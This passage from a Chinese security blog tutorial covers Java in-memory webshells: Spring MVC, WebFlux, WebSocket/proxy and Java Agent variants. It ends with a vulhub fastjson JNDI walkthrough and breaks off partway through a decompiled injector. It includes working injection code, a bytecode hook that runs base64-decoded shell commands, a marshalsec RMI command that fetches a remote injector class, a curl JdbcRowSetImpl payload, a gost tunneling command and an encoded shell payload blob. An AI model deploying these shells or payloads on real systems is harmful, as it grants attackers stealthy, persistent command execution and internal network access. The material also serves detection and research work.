- `registerMapping` 是 Spring 5.1+ 的公开 API；更老版本要反射 `mappingRegistry` 私有字段，字段名随版本漂移

Spring Boot 版本决定了包名

![image-20261026110249689](/Levi38_blog/images/java-memshell/image-20261026110249689.png)

**Spring Boot 2.x（使用 javax.servlet）**
**Spring Boot 3.x（使用 jakarta.servlet）**

##### **构造过程**

① 入口：拿到代码执行权

② 拿路由表管家

  RequestMappingHandlerMapping mapping = ctx.getBean(RequestMappingHandlerMapping.class);

 Tomcat型要两层反射挖 StandardContext，Spring 型只要问容器要 bean。

  ③ 幂等检查

  for (RequestMappingInfo info : mapping.getHandlerMethods().keySet()) {
      if (info.getPatternValues().contains("/memshell")) return "已存在";
  }

  ④ 构造马体：匿名对象 + 普通方法

  ⑤ 构造注册信息（版本坑所在）

  RequestMappingInfo info = RequestMappingInfo
          .paths("/memshell")          // 实战伪装成 /api/config 之类
          .methods(RequestMethod.GET)
          **.options(mapping.getBuilderConfiguration())**   // ★ **Boot 2.6+ 必带，否则匹配策略和应用不一致 → 全站 500**
          .build();

  ⑥ 过账

  mapping.registerMapping(info, evilController, method);

  这一行往 mappingRegistry 里写入条目（pathLookup、registry 等 Map）下一个请求立即可路由。

##### demo结构

springmvc_demo/ → Spring 层，Controller 型 
      ├── pom.xml                        # Boot 2.7.18 = SF 5.3.31 + 内嵌 Tomcat 9 + javax
      ├── settings.xml / README.md
      └── src/main/
          ├── DemoApplication.java       # java -jar 即跑，端口 18080
          ├── controller/TimeController.java        # /time 对照组
          ├── shell/InjectMemshellController.java   # /makememshell 入口 + 马体
          └── resources/application.yml

首先执行/makeshell注入内存马

然后在memshell路由的请求头中添加X-Cmd base64传入命令即可执行

![image-20261026114308943](/Levi38_blog/images/java-memshell/image-20261026114308943.png)

### springWebFLux内存马

#### springWebFLux是什么

Spring WebFlux 是 Spring Framework 5.0 版本中加入的**响应式 Web 框架**，与传统的 Spring MVC 并列存在。它的核心特点是**完全非阻塞**，基于 Reactive Streams 规范（支持背压），能够在 Netty、Undertow 以及 Servlet 3.1+ 容器上运行。

#### **NettyHandler 型**

在reactor.netty的部分有具体体现

#### **HandlerMapping 型**

DispatcherHandler的handle的处理逻辑是这样的

![image-20261104224749922](/Levi38_blog/images/java-memshell/image-20261104224749922.png)

```
 return Flux.fromIterable(this.handlerMappings)          // ① 从字段里现场取出 mapping 列表
          .concatMap(mapping -> mapping.getHandler(exchange))  // ② 逐个查询是否处理
          .next()                                           //    第一个查询到后 后面的就作废
          .switchIfEmpty(createNotFoundError())             //    全部弃权 → 404
          .flatMap(handler -> invokeHandler(exchange, handler))  // ③ 找 adapter 执行认领者
          .flatMap(result -> handleResult(exchange, result));   // ④ 写回响应
```

所以这个马的逻辑就是往 `DispatcherHandler.handlerMappings` 里塞一个恶意 HandlerMapping**每个请求现场遍历这张表**，所以运行时注入立即生效

利用环境版本：Spring Boot 2.7.18，JDK 8+

注入逻辑（demo 的 /inject）：

```
DispatcherHandler dh = applicationContext.getBean(DispatcherHandler.class);
Field f = findField(dh.getClass(), "handlerMappings");   // getDeclaredField 不查父类，要向上找
f.setAccessible(true);
List<HandlerMapping> mappings = (List) f.get(dh);
// 幂等判断后：
List<HandlerMapping> newList = new ArrayList<>(mappings);
newList.add(0, new EvilHandlerMapping());   // ★ 不能 mappings.add()——列表是不可变的，只能整字段换值
f.set(dh, newList);
```

马体核心（EvilHandlerMapping + EvilHandlerFunction）：

```
public class EvilHandlerMapping implements HandlerMapping, Ordered {
    public Mono<Object> getHandler(ServerWebExchange exchange) {
        if (exchange.getRequest().getPath().value().startsWith("/shell")) {
            // ★ HandlerFunctionAdapter 要求 exchange 有 RouterFunctions.request 属性
            //   （平时由 RouterFunctionMapping 匹配时塞入），自定义 mapping 必须自己补
            ServerRequest request = ServerRequest.create(exchange, MESSAGE_READERS);
            exchange.getAttributes().put(RouterFunctions.REQUEST_ATTRIBUTE, request);
            return Mono.just(new EvilHandlerFunction());
        }
        return Mono.empty();   // 透传
    }
    public int getOrder() { return Ordered.HIGHEST_PRECEDENCE; }
}

public class EvilHandlerFunction implements HandlerFunction<ServerResponse> {
    public Mono<ServerResponse> handle(ServerRequest request) {
        String cmd = request.queryParam("cmd").orElse("").trim();
        if (cmd.isEmpty()) return ServerResponse.ok().bodyValue("usage...");
        return Mono.fromCallable(() -> exec(cmd))
                .subscribeOn(Schedulers.boundedElastic())
                .flatMap(output -> ServerResponse.ok().bodyValue(output));
    }
}
```

只处理注册的路由（/shell），404 路径不触发

这里可以对比注入前后handlermappings的变化可以看到我们注入的恶意mapping在最初执行了

![image-20261104225218827](/Levi38_blog/images/java-memshell/image-20261104225218827.png)

![image-20261104225145508](/Levi38_blog/images/java-memshell/image-20261104225145508.png)

![image-20261104225134400](/Levi38_blog/images/java-memshell/image-20261104225134400.png)

#### **WebFilter 型**

DefaultWebFilterChain 在构造时把 filter 链固化成嵌套链表，运行时 `filter()` 走嵌套引用、不读 allFilters 列表，我们无法直接插入一个Filter到开头而必须整链替换

利用环境版本：同 HandlerMapping 型

定位链

```
HttpHandler bean = HttpWebHandlerAdapter
  → getDelegate() → ExceptionHandlingWebHandler
    → getDelegate() → FilteringWebHandler        ★ 目标（注意类名，老版本叫 FilterWebHandler）
```

注入逻辑：

```
FilteringWebHandler fwh = ...;                                  // 上面的链 walk 出来
WebHandler tail = fwh.getDelegate();                            // 链尾 handler
List<WebFilter> newFilters = new ArrayList<>(fwh.getFilters());
newFilters.add(0, new EvilWebFilter());
DefaultWebFilterChain newChain = new DefaultWebFilterChain(tail, newFilters);  // public 构造器
Field f = FilteringWebHandler.class.getDeclaredField("chain");  // 反射换 chain 字段

f.setAccessible(true);
f.set(fwh, newChain);
```

马体核心（EvilWebFilter）：

```
public class EvilWebFilter implements WebFilter {
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String path = exchange.getRequest().getPath().value();
        String cmd = exchange.getRequest().getQueryParams().getFirst("cmd");
        if (path.startsWith("/shell") && cmd != null && !cmd.trim().isEmpty()) {
            return Mono.fromCallable(() -> exec(cmd))
                    .subscribeOn(Schedulers.boundedElastic())
                    .flatMap(output -> exchange.getResponse().writeWith(
                            Mono.just(exchange.getResponse().bufferFactory()
                                    .wrap(output.getBytes(charset))));   // 截断：不调 chain.filter
        }
        return chain.filter(exchange);   // 透传：= Filter 马的 chain.doFilter
    }
}
```

特性：WebFilter 天生全路径（demo 用 "/shell + cmd" 双条件收窄)
`/*` 全路径劫持——这正是它和 HandlerMapping 型的区别

![image-20261104231725466](/Levi38_blog/images/java-memshell/image-20261104231725466.png)

![image-20261104231801276](/Levi38_blog/images/java-memshell/image-20261104231801276.png)

![image-20261104231744265](/Levi38_blog/images/java-memshell/image-20261104231744265.png)

## 其他类型内存马

### WebSocket内存马

WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。

#### 服务端实现方式

##### （1）注解方式

```
COPY@ServerEndpoint(value = "/ws/{userId}", encoders = {MessageEncoder.class}, decoders = {MessageDecoder.class}, configurator = MyServerConfigurator.class)
```

Tomcat在启动时会默认通过 WsSci 内的 ServletContainerInitializer 初始化 Listener 和 servlet。然后再扫描 `classpath`下带有 `@ServerEndpoint`注解的类进行 `addEndpoint`加入websocket服务

##### （2）继承抽象类Endpoint方式

继承抽象类 `Endpoint`方式比加注解 `@ServerEndpoint`方式更麻烦，主要是需要自己实现 `MessageHandler`和 `ServerApplicationConfig`。`@ServerEndpoint`的话都是使用默认的，原理上差不多，只是注解更自动化，更简洁

#### websocket内存马实现方法

Tomcat 在启动时会默认通过 WsSci 内的 ServletContainerInitializer 初始化 Listener 和 servlet。然后再扫描 `classpath`下带有 `@ServerEndpoint`注解的类进行 `addEndpoint`加入websocket服务

我们可以在服务启动后addEndpoint 加入websocket服务，只需三步。创建一个ServerEndpointConfig，获取ws ServerContainer，加入 ServerEndpointConfig，即可

```
COPYServerEndpointConfig config = ServerEndpointConfig.Builder.create(EndpointInject.class, "/ws").build();
ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());
container.addEndpoint(config);
```

这里复现用的是星火工作室的项目[veo/wsMemShell: WebSocket 内存马/Webshell，一种新型内存马/WebShell技术](https://github.com/veo/wsMemShell)

测试环境：Spring Boot 2.7.18 + 内嵌 Tomcat 9

先访问/wscmd.jsp?path=/ws

将内存马注入到/ws下

再使用yakit的websocket fuzzer连接即可执行命令

![image-20261105111432431](/Levi38_blog/images/java-memshell/image-20261105111432431.png)

![image-20261105111632442](/Levi38_blog/images/java-memshell/image-20261105111632442.png)

#### 代理内存马

由于WebSocket是一种全双工通信协议，它也可以用来做代理，且速度和普通的TCP代理一样快

如果环境不出网

```
注入代理内存马

wsproxy.jsp?path=/proxy

用gost搭隧道

./gost.exe -L "socks5://:1080" -F "ws://目标:8085?path=/proxy"

之后代理socks5://:1080即可访问内网
```

用gost 是因为 -F ws://... 让 gost 自己做 WebSocket 客户端完成握手并封装 TCP 流，而iox 的 fwd/proxy 只会发裸
TCP，连到 /proxy 端点后不会发生WS握手 ，连不通



### Agent内存马

#### Java Agent机制

Java Agent是一种基于 JVM 的 `java.lang.instrument` 包构建的特殊程序，它能在 Java 应用启动前或运行中介入，通过修改字节码来增强或监控应用

支持两种方式进行加载：

```
// premain：JVM 启动时加载（-javaagent:xx.jar），来得早，class 加载时就能改
public static void premain(String args, Instrumentation inst) {}
// agentmain：★ 运行中 attach 进来 —— 内存马用的是这个
public static void agentmain(String args, Instrumentation inst) {}
```

premain方式顾名思义就是在启动时在main方法之前进行调用，所以只能在 main 加载之前处理，但是内存马注入的情况基本都是处于 JVM 已运行了的情况，所以这种方式就不太适用

而agentmain方式可以在 main 函数开始运行之后再运行 所以可以用来

##### Instrumentation 是什么

Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果，有了它我们就可以修改已加载的类本身

在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据

Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码

它的核心 API

     public interface Instrumentation {
      // ① 注册transformer
      void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
     
     // ② 对已经加载的类发起重处理
      void retransformClasses(Class<?>... classes);
    
      // ③ 读信息
      Class[] getAllLoadedClasses();          // JVM 里现在有哪些类
      long  getObjectSize(Object o);          // 对象占多大内存
    
      // ④ Class 定义：直接把 byte[] 变成一个 Class
      Class<?> defineClass(ClassLoader loader, String name, byte[] bytes, ...);
    }
所以从这里我们就可以知道Agent马实现的关键步骤

```
addTransformer(恶意transformer) →

retransformClasses(ApplicationFilterChain.class) → 

把这个已加载的类拉回关重审→ 

transformer 收到它的原字节码 →

Javassist 往 internalDoFilter 开头插马代码 → 

返回新字节码→ 

JVM 用新字节码替换方法区里的旧方法体→ 

此后每个请求过 internalDoFilter，先执行插入的那几行
```

##### 自我attach

通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法

```
vm = VirtualMachine.attach("12345") 
vm.loadAgent("/path/agent.jar") 
```

这就是**正常**的attach过程，用于外部进程调用JVM

而自我attach就是当我们已经反序列化RCE 我的代码跑在目标JVM里面了，但是没有Instrumentation

此时我们在 JVM 里面的代码，假装成“外部工具”，attach自己，给自己发一个 loadAgent 请求：

  ```
  // 这段代码运行在目标JVM内部（RCE点）
    String myPid = ManagementFactory.getRuntimeMXBean().getName().split("@")[0]; // 查自己pid
    VirtualMachine vm = VirtualMachine.attach(myPid);  // ← 自我attach
    vm.loadAgent("/tmp/evil.jar");                     // ← 加载agent
  ```

  JVM 不分辨请求来自谁：加载 evil.jar → 调它的 agentmain → 递出 Instrumentation → 恶意代码拿到许可证，开始
 retransformClasses。

##### 马体

  篡改的类常见的类型：

*  改 Tomcat 的ApplicationFilterChain.internalDoFilter——往方法开头插几行：检查请求参数有无暗号，有就 exec
    回显，没有就 return 继续走原逻辑
* 改业务自己的某个 Filter/Controller 方法

#### 内存马实现

编译期：  准备 agent jar：MANIFEST 里声明 Agent-Class（agentmain 所在类）+ Can-Retransform-Classes: true

注入： GET /inject（模拟 RCE 点）
            → 落盘 agent.jar → URLClassLoader 加载 tools.jar 的 attach API
            → attach(自己pid) + loadAgent(临时文件)      ← 自我 attach
            → Tomcat 的 JVM：读 MANIFEST → 加载 AgentMain → 调 agentmain(args, inst)

改造： agentmain：addTransformer(EvilTransformer) + retransformClasses(...)
            → transform() 收到原字节码 → javassist 插桩 → 返回新字节码
            → JVM 替换方法区里 internalDoFilter 的方法体（类身份不变）

之后：每个请求 → internalDoFilter（已被改）
            带 pass？ → Base64 解码 → exec → 回显 → return（404 都不会产生）
            不带    → 落入原方法体

AgentMain.java

```
package com.example.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;

/**
 * Agent 型内存马的入口 —— JVM 通过 attach 协议加载本 jar 后调用这里，
 * 并把 Instrumentation（"改类许可证"）作为参数递进来。
 *
 * 这是全链路唯一能拿到 Instrumentation 的时刻：
 * 普通 Java 代码（RCE 点）没有任何办法凭空获得它。
 */
public class AgentMain {

    /** 防 agent 被加载两次时重复插桩（loadAgent 重复调用仍会进 agentmain） */
    private static volatile boolean transformed = false;

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        if (transformed) {
            System.out.println("[AgentShell] 已插桩，跳过");
            return;
        }
        transformed = true;

        // ① 在"海关"挂检查站：canRetransform=true 才允许处理【已加载】的类
        ClassFileTransformer transformer = new EvilTransformer();
        inst.addTransformer(transformer, true);

        // ② 把已经加载的 ApplicationFilterChain 押回检查站重新过一遍
        //    注意：不能用 Class.forName（会拿系统类加载器视角，找不到 Tomcat 的类），
        //    必须从 getAllLoadedClasses() 里按名字找 JVM 实际加载的那个 Class 对象
        for (Class<?> c : inst.getAllLoadedClasses()) {
            if ("org.apache.catalina.core.ApplicationFilterChain".equals(c.getName())) {
                inst.retransformClasses(c);
                System.out.println("[AgentShell] ApplicationFilterChain 已被 retransform");
                break;
            }
        }

        // 给 webapp 的幂等检查用
        System.setProperty("agent.demo.injected", "true");
    }
}
```

EvilTransformer.java

```
package com.example.agent;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

/**
 * 恶意 ClassFileTransformer —— "海关检查站"。
 *
 * retransformClasses(ApplicationFilterChain.class) 触发本类的 transform()：
 * 拿到【原字节码】 → javassist 往 internalDoFilter 方法体开头插马代码 → 返回新字节码
 * → JVM 用新版本替换方法区里的方法体。类名/身份/注册状态全都不变，变的只是方法行为。
 */
public class EvilTransformer implements ClassFileTransformer {

    // ★ transform() 收到的 className 是 JVM 内部格式（斜杠分隔）——
    //   写成点分隔永远匹配不上，retransform 会"成功"但 transform 收不到目标类（实测踩坑）
    private static final String TARGET = "org/apache/catalina/core/ApplicationFilterChain";

    /** 插入 internalDoFilter 开头的代码：暗号(pass 参数) + 劫持/透传双模式（Filter 马的翻版） */
    private static final String HOOK = "{" +
            "  try {" +
            "    String _cmd = $1.getParameter(\"pass\");" +
            "    if (_cmd != null && _cmd.length() > 0) {" +
            "      String _c = new String(java.util.Base64.getDecoder().decode(_cmd));" +
            "      boolean _w = System.getProperty(\"os.name\").toLowerCase().contains(\"win\");" +
            "      String[] _cmds = _w ? new String[]{\"cmd.exe\",\"/c\",_c} : new String[]{\"/bin/sh\",\"-c\",_c};" +
            "      Process _p = Runtime.getRuntime().exec(_cmds);" +
            "      java.util.Scanner _s = new java.util.Scanner(_p.getInputStream(), _w ? \"GBK\" : \"UTF-8\").useDelimiter(\"\\\\A\");" +
            "      String _o = _s.hasNext() ? _s.next() : \"\";" +
            "      $2.setContentType(\"text/plain;charset=UTF-8\");" +
            "      $2.getWriter().println(_o);" +
            "      return;" +                                   // 截断：命令回显后请求到此为止
            "    }" +
            "  } catch (Exception _e) {}" +                     // 其他错误静默，别把业务打挂
            "}";                                                // 无 pass 参数：落到原方法体 = 透传

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        if (!TARGET.equals(className)) {
            return null;   // 别的类一概放行
        }
        try {
            // 编译插入代码要解析 $1.getParameter 的类型（javax.servlet.ServletRequest）——
            // 用【正在加载该类的那个类加载器】作类路径（Tomcat common loader 能看见 servlet-api）
            ClassPool pool = new ClassPool(true);
            if (loader != null) {
                pool.appendClassPath(new LoaderClassPath(loader));
            }
            // 类本身从传入字节码读，不查任何 jar（transformer 的环境里未必有 catalina.jar）
            CtClass cc = pool.makeClass(new ByteArrayInputStream(classfileBuffer));
            CtMethod m = cc.getDeclaredMethod("internalDoFilter");
            m.insertBefore(HOOK);
            byte[] out = cc.toBytecode();
            cc.detach();
            System.out.println("[AgentShell] internalDoFilter 插桩完成");
            return out;
        } catch (Throwable t) {
            t.printStackTrace();
            return null;   // 插桩失败就放行原字节码，别弄崩 JVM
        }
    }
}
```

注入前后注册表无变化![image-20261106131618085](/Levi38_blog/images/java-memshell/image-20261106131618085.png)

![image-20261106131650418](/Levi38_blog/images/java-memshell/image-20261106131650418.png)

注入成功后任意路径都可触发命令

![image-20261106131734963](/Levi38_blog/images/java-memshell/image-20261106131734963.png)

#### 优点

  1. 注册表零痕迹

     马寄生在 internalDoFilter 方法体前几行

  2. 载体选择自由

     不依赖任何 HTTP 结构、不依赖任何注册表、不依赖任何框架，Agent 型的宿主是JVM 里任意已加载类。

#### 限制

JDK 版本限制：8 默认放行自我 attach；9+ 默认禁（需目标启动参数-Djdk.attach.allowAttachSelf=true）

环境依赖：tools.jar 必须有（精简容器、裸 JRE 部署会断）attach 临时文件必须可写

## 实战利用

上述内存马都是直接写在了环境当中，而在实战中我们要利用内存马，首先必须能在目标 JVM 内执行代码，或者能 attach 到那个 JVM

比如我们能打到**反序列化** **JNDI 注入** **表达式注入**等漏洞 那么就能执行代码往环境中注入内存马 我们拿**fastjson反序列化**来进行分析

### 目标环境

这里用到的环境是vulhub的项目[vulhub/fastjson/1.2.24-rce at master · vulhub/vulhub](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce)

目标环境是 Java 8u102，没有 `com.sun.jndi.rmi.object.trustURLCodebase` 的限制，我们可以使用 `com.sun.rowset.JdbcRowSetImpl` 的利用链，通过 JNDI 注入来执行命令

### 利用过程

首先我们使用MemShellParty生成一个Filter马 打包分类和变体勾选`Base64` / `DefaultBase64`

生成的注入器为`org.slf4j.utils.compile.OriginAwaitingUtils`将其注入器的class文件保存到对应的目录

注意JNDI会按类名拼路径请求 所以我们的目录也要遵循org.slf4j.utils.compile的层级结构

![image-20261108164620016](/Levi38_blog/images/java-memshell/image-20261108164620016.png)

然后在test根目录起一个http服务

之后利用marshalsec起一个rmi服务 因为是docker环境 所以我们用host.docker.internal这种docker能访问到的地址

```
java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://host.docker.internal:8888/#org.slf4j.utils.compile.OriginAwaitingUtils" 1099
```

再打JdbcRowSetImpl的利用链就能执行注入器从而写入内存马

```
curl.exe -i -X POST http://127.0.0.1:8090/ -H "Content-Type: application/json" --data-binary '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://host.docker.internal:1099/org.slf4j.utils.compile.OriginAwaitingUtils","autoCommit":true}}'
```

![image-20261108162805175](/Levi38_blog/images/java-memshell/image-20261108162805175.png)

![image-20261108162856362](/Levi38_blog/images/java-memshell/image-20261108162856362.png)

### 源码分析

此时我们反编译看看这个注入器是怎么写的

```
/*
 * Decompiled with CFR 0.152.
 *
 * Could not load the following classes:
 *  java.io.ByteArrayInputStream
 *  java.io.ByteArrayOutputStream
 *  java.io.IOException
 *  java.io.InputStream
 *  java.io.OutputStream
 *  java.io.PrintStream
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.ClassLoader
 *  java.lang.Exception
 *  java.lang.IllegalAccessException
 *  java.lang.Integer
 *  java.lang.NoSuchFieldException
 *  java.lang.NoSuchMethodException
 *  java.lang.Object
 *  java.lang.String
 *  java.lang.System
 *  java.lang.Thread
 *  java.lang.Throwable
 *  java.lang.reflect.Array
 *  java.lang.reflect.Constructor
 *  java.lang.reflect.Field
 *  java.lang.reflect.Method
 *  java.util.HashSet
 *  java.util.Map
 *  java.util.Set
 *  java.util.zip.GZIPInputStream
 */
package org.slf4j.utils.compile;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

public class OriginAwaitingUtils {
    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "org.apache.http.web.handlers.sidecar.ParameterizedRestartingFilter";
    }

    public String getBase64String() {
        return "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";
    }

    public OriginAwaitingUtils() {
        if (ok) {
            return;
        }
        Set<Object> set = null;
        try {
            set = this.getContext();
        }
        catch (Throwable throwable) {
            msg = msg + "context error: " + this.getErrorMessage(throwable);
        }
        if (set == null || set.isEmpty()) {
            msg = msg + "context not found";
        } else {
            for (Object object : set) {
                try {
                    msg = msg + "context: [" + this.getContextRoot(object) + "] ";
                    Object object2 = this.getShell(object);
                    this.inject(object, object2);
                    msg = msg + "[" + this.getUrlPattern() + "] ready\n";
                }
                catch (Throwable throwable) {
                    msg = msg + "failed " + this.getErrorMessage(throwable) + "\n";
                }
            }
        }
        ok = true;
    }

    public Set<Object> getContext() throws Exception {
        HashSet hashSet = new HashSet();
        Set set = Thread.getAllStackTraces().keySet();
        for (Thread thread : set) {
            Object object;
            Object object2;
            Object object3;
            String string = thread.getName();
            if (string.contains((CharSequence)"ContainerBackgroundProcessor")) {
                object3 = (Map)OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(thread, "target"), "this$0"), "children");
                object2 = object3.values().iterator();
                while (object2.hasNext()) {
                    object = object2.next();
                    Map map = (Map)OriginAwaitingUtils.getFieldValue(object, "children");
                    hashSet.addAll(map.values());
                }
                continue;
            }
            if (string.contains((CharSequence)"Poller") && !string.contains((CharSequence)"ajp")) {
                try {
                    object3 = OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
                    object2 = OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(OriginAwaitingUtils.getFieldValue(object3, "adapter"), "connector"), "service"), "engine");
                    object = (Map)OriginAwaitingUtils.getFieldValue(object2, "children");
                    for (Object object4 : object.values()) {
                        Map map = (Map)OriginAwaitingUtils.getFieldValue(object4, "children");
                        hashSet.addAll(map.values());
                    }
                    continue;
                }
                catch (Exception exception) {
                    continue;
                }
            }
            if (thread.getContextClassLoader() == null || !(object3 = thread.getContextClassLoader().getClass().getSimpleName()).matches(".+WebappClassLoader") || (object2 = OriginAwaitingUtils.getFieldValue(thread.getContextClassLoader(), "resources")) == null || !object2.getClass().getName().endsWith("Root")) continue;
            object = OriginAwaitingUtils.getFieldValue(object2, "context");
            hashSet.add(object);
        }
        return hashSet;
    }

    private String getContextRoot(Object object) {
        String string = null;
        try {
